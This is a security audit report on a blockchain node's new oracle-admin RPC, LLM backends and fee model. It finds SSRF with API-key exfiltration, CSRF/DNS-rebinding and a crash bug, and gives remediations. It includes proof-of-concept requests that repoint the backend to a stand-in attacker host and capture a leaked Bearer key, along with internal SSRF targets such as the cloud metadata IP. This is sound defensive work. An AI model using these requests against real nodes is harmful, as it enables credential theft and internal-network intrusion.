# Security Gate — Cycle 5 (fees + loopback oracle-admin RPC + LLM backends + deep explorer)

- Branch: `feat/fees-llm-explorer-ui` @ `741e27f`
- Scope: the new attack surface — the loopback oracle-admin RPC (`ubi_getOracleConfig` /
  `ubi_setOracleConfig`), the configurable LLM backends (Anthropic / Ollama / OpenAI), the native UBI
  fee model, the deep-explorer reads, and replay/privacy from the new tx fields.
- PoCs: `crates/rpc/tests/sec_c5_poc.rs` (5 tests, all green) + live captures against a node on
  `127.0.0.1:38545` (documented inline below).

## Verdict: FAIL — 1 Critical, 2 High open.

Do not ship until C5-SEC-1, C5-SEC-2, and C5-SEC-3 are remediated. The fee model, secret redaction,
LLM-injection fencing, and replay protection are sound (no open finding).

---

## C5-SEC-1 — SSRF + provider-API-key exfiltration via unvalidated `base_url` (CRITICAL)

`ubi_setOracleConfig({ provider, base_url, ... })` accepts an arbitrary, attacker-chosen `base_url`
with **no validation** (no scheme allowlist, no host/port check, no block on link-local/loopback/
internal hosts). That URL flows unmodified through `OracleConfig.base_url` →
`ubi2_oracle::Backend.base_url` → `OllamaTransport::new(base)` / `OpenAiTransport::new(base, api_key)`
(`crates/oracle/src/backend.rs:177-189`). On the next oracle invocation the node issues an HTTP `POST`
to that URL. For the OpenAI-compatible path it attaches `Authorization: Bearer <api_key>`, where the
key is read from the node's configured env var (`OPENAI_API_KEY`, or whatever `api_key_env` names) or
from a raw `api_key` param. No validation exists anywhere on this path:
`crates/rpc/src/oracle_admin.rs` stores `base_url` verbatim; `crates/node/src/oracle_cfg.rs`
(`backend_from_config`) copies it verbatim; `crates/oracle/src/backend.rs` dials it verbatim.

This is a server-side request forgery primitive (the node can be made to hit internal/metadata
endpoints — `http://169.254.169.254/`, `http://127.0.0.1:<port>/`, `http://[::1]:6379/`,
`*.svc.cluster.local`) **and** an API-key exfiltration primitive (the operator's real provider key is
sent as a Bearer token to the attacker's URL, along with all proof-of-humanity / contract prompts,
which carry the applicant evidence).

### Live PoC (captured)

1. Boot the node with a legitimate operator key: `OPENAI_API_KEY=sk-BOOT-ENV-OPERATOR-KEY-xyz789`.
2. Attacker (loopback — see C5-SEC-2 for how a browser reaches it) repoints only `base_url`,
   supplying **no** key:
   ```
   ubi_setOracleConfig [{ "provider":"openai", "model":"gpt-4o", "base_url":"http://127.0.0.1:39099" }]
     → { active:"live", config:{ base_url:"http://127.0.0.1:39099", ... } }
   ```
3. Any account submits a fee-exempt `requestVerification` tx (HumanityHub `0x…5048`). On the next
   block the node calls the now-attacker-pointed OpenAI backend. The attacker's listener captured:
   ```
   POST /v1/chat/completions
   authorization: Bearer sk-BOOT-ENV-OPERATOR-KEY-xyz789      ← operator key exfiltrated
   body: {"model":"gpt-4o","messages":[{"role":"system","content":"You are a deterministic
          verification component ... "}, ... ]}                ← full prompt + applicant evidence leaked
   ```
   The attacker supplied no key; the node volunteered the operator's boot-env key.

### Offline PoC

`crates/rpc/tests/sec_c5_poc.rs::ssrf_base_url_flows_unvalidated_to_the_backend_with_the_key` and
`::ssrf_internal_targets_are_not_rejected` assert the hostile `base_url` and the raw key reach the
build seam the node dials, and that internal targets (metadata IP, loopback ports, k8s names) are all
accepted.

### Remediation

- **Allowlist `base_url`** in `ubi_setOracleConfig` (and in the boot-config loader): require `https`
  for cloud providers, and restrict the host to an operator-configured allowlist of provider domains
  (e.g. `api.openai.com`, `api.anthropic.com`, `openrouter.ai`, plus an explicit local-Ollama opt-in
  like `127.0.0.1:11434`). Reject literal IPs in the link-local/metadata ranges
  (`169.254.0.0/16`, `127.0.0.0/8` except an explicit Ollama opt-in, `::1`, RFC1918) and reject
  redirects to such targets at the transport (`reqwest` redirect policy → none, or a
  custom-resolved/validated address). Fail closed (`ERR_BAD_CONFIG`) on a disallowed URL.
- Treat the API key as a **per-host** credential: never attach the Bearer header unless the resolved
  host is on the provider allowlist for that key, so a repointed `base_url` cannot ride the key.

---

## C5-SEC-2 — Browser CSRF / DNS-rebinding against the loopback admin RPC (HIGH)

The loopback gate (`require_loopback`, `crates/rpc/src/lib.rs:1598`) is **real and correctly TCP-peer
based** — it reads the connection's peer `SocketAddr` injected by `serve`'s accept loop
(`lib.rs:3316-3317`), not any `Host` / `X-Forwarded-For` / `Forwarded` header, so header spoofing
cannot reach the admin methods (verified:
`sec_c5_poc.rs::non_loopback_peer_is_rejected_and_headers_cannot_override`). **But the TCP-peer check
is the *only* gate**, and a web browser request originates from the loopback interface, so a malicious
web page the victim visits satisfies it. Combined with:

- a fully **permissive CORS** layer (`tower_http::cors::CorsLayer::permissive()`, `lib.rs:3282`) — the
  live server answers a cross-origin request from `https://evil.example.com` with
  `access-control-allow-origin: *`, `access-control-allow-methods: *`, `access-control-allow-headers: *`
  (captured live), so the browser permits the cross-origin `application/json` POST (preflight passes);
- **no Origin allowlist, no CSRF token, and no `Host`-header pinning** (no DNS-rebinding defense),

a page the operator browses to can silently call `ubi_setOracleConfig` and repoint the node's LLM
backend — directly enabling C5-SEC-1 (key exfiltration) with zero network access to the victim's host.

### Live PoC (captured)

```
POST http://127.0.0.1:38545
Origin: https://evil.example.com
content-type: application/json
{"method":"ubi_setOracleConfig","params":[{"provider":"ollama","base_url":"http://attacker.evil:1234"}]}
  → 200 OK, access-control-allow-origin: *, result.active="live", config.base_url="http://attacker.evil:1234"
```
The cross-origin call succeeded and hot-swapped the backend. Offline analogue:
`sec_c5_poc.rs::browser_csrf_shape_is_accepted_because_only_tcp_peer_is_checked`.

### Remediation

- **Defend against DNS-rebinding**: validate the `Host` header on admin requests against an allowlist
  (`127.0.0.1:<port>`, `localhost:<port>`) and reject any other Host. This is the standard local-RPC
  rebinding defense (geth/erigon do exactly this).
- **Scope CORS**: do not return `access-control-allow-origin: *` for the `ubi_*` admin methods; restrict
  the admin surface's allowed origins to the wallet's origin (or disallow cross-origin entirely for
  admin methods). The permissive CORS for the read/EVM methods can stay if needed for the local wallet.
- **Add a real auth token** for the admin methods (a one-time secret printed to the node console / read
  from the data dir), so loopback alone is not authority. Required for any non-devnet deployment;
  recommended even on devnet given the key-exfiltration impact.

---

## C5-SEC-3 — A live LLM backend invocation panics the block-production task (DoS / availability) (HIGH)

`produce_block` is driven directly on the node's async block-production loop
(`crates/node/src/main.rs:185`), and the oracle/interpreter transports use a **blocking** reqwest
client (`reqwest::blocking::Client` in `crates/oracle/src/backend.rs` Ollama/OpenAI and
`crates/oracle/src/client.rs` Anthropic). When a live backend is actually invoked inside that async
context, dropping the blocking client's inner runtime panics:

```
thread 'main' panicked at tokio .../blocking/shutdown.rs:51:
Cannot drop a runtime in a context where blocking is not allowed.
```

The node process dies (verified twice live: after a `requestVerification` triggered the configured
OpenAI backend, the node became unresponsive and exited). Because (a) the live backend is remotely
configurable via the CSRF-reachable admin RPC (C5-SEC-2) and (b) the triggering op
(`requestVerification`) is **fee-exempt and submittable by any account**, this is a remotely triggerable
node-kill. It also means the live-backend feature is **non-functional** as shipped — the first real
humanity/contract op crashes the node regardless of attacker intent.

### Remediation

- Run `produce_block` (or at least the oracle/interpreter calls within it) on a blocking thread —
  e.g. `tokio::task::spawn_blocking` around the block tick, or move block production off the async
  runtime entirely. Alternatively switch the transports to the async reqwest client and `await` them,
  but the cleaner fix given the current synchronous runtime traits is `spawn_blocking`.
- Add an integration test that exercises a (stubbed, local) live transport through `produce_block` so
  this is caught in CI — today no test drives the live transport through the async block loop (I5 keeps
  transports out of CI, which is why this slipped).

---

## Areas reviewed and found sound (no open finding)

### Fee model (no negative/overflow/drain/free-tx) — PASS
- `gas_used` is a fixed per-kind constant (`GAS_TRANSFER`=21k … `GAS_CONTRACT`=120k), never
  attacker-supplied; `fee_for_gas = gas * 1 gwei` maxes at `1.2e14` base units — no u128 overflow, no
  negative path. The tx `value`/`gasLimit` cannot influence the charged fee.
- `charge_fee` (`crates/runtime/src/lib.rs:138`) settles emission first, checks
  `settled_balance >= fee`, then debits sender and credits `TREASURY` by the **same** amount — value is
  conserved; the treasury can only gain (no method pays out of it). An under-funded tx is dropped with
  no state change.
- The pre-fee snapshot rollback on op failure (`crates/rpc/src/lib.rs:1272-1292`) restores both sender
  and treasury exactly, so a dropped tx is neither charged nor leaves partial state (no free-tx, no
  double-spend). Covered by `crates/rpc/tests/fee_model.rs` (conservation, fee-exemption,
  insufficient-balance no-mutation, per-kind estimate). `requestVerification` is intentionally
  fee-exempt — a bounded onboarding subsidy gated by one-open-case-per-subject + cooldown.

### Secret handling / redaction (I6) — PASS
- The persisted `<data_dir>/oracle.json` contains only `provider`/`model`/`base_url` — **no key value
  and no `api_key` field** (verified on disk). The raw key never appears in node logs (verified). The
  admin response redacts the key: only the env-var *name* survives.
  (`sec_c5_poc.rs::raw_api_key_never_surfaces_in_the_admin_response`.)
- Minor note (not a finding): a raw `api_key` supplied via the admin RPC is written to the node's
  **process env** (`std::env::set_var`, `crates/node/src/oracle_cfg.rs:150`) and persists for the
  process lifetime / is inherited by any child process. Acceptable for devnet; revisit if the node ever
  spawns subprocesses.

### LLM-backend injection fencing (Ollama / OpenAI parity) — PASS
- All three backends consume the same provider-neutral `MessagesRequest`: the injection-fenced prompts
  (`crates/oracle/src/prompt.rs`, `<<<UBI2_UNTRUSTED_EVIDENCE_BEGIN/END>>>`, role-separated system
  rules), `temperature: 0`, the pinned model id, and the closed structured-output JSON schema. Ollama
  passes the schema as `format`; OpenAI passes it as `response_format.json_schema { strict: true }`.
  The live capture above shows the fence present in the OpenAI-bound body. No injection-fencing or
  schema-constraint regression across backends; identical canonical verdicts
  (`crates/oracle/src/backend.rs` `all_three_backends_yield_identical_canonical_verdict`).

### Replay / privacy from the new tx fields — PASS
- The new per-tx fields are `gas_used` (a deterministic per-kind constant) and the fee — both derived
  from the tx kind, not new signed inputs, so they add no replay surface. Nonce-based replay protection
  (`apply_transfer` / `consume_nonce`) is unchanged; the fee is charged on the same nonce'd tx. The
  deep-explorer reads (`ubi_getBlock`/`ubi_getTransaction`) surface only already-public on-chain data
  (hashes, addresses, decoded calls/logs, effect hashes) — no PII/prose, consistent with I6.

---

## Fix tracking

| ID        | Severity | Status | Blocking gate |
|-----------|----------|--------|---------------|
| C5-SEC-1  | Critical | OPEN   | yes |
| C5-SEC-2  | High     | OPEN   | yes |
| C5-SEC-3  | High     | OPEN   | yes |
| C5-SEC-4 (env-var key residency) | Info | Noted | no |

Re-run `cargo test -p ubi2-rpc --test sec_c5_poc` after fixes; the SSRF/CSRF PoCs should be **inverted**
(the hostile `base_url` and the cross-origin admin call must be rejected) once the allowlist + Host
pinning land, and a `produce_block`-through-live-transport test must pass without panicking.
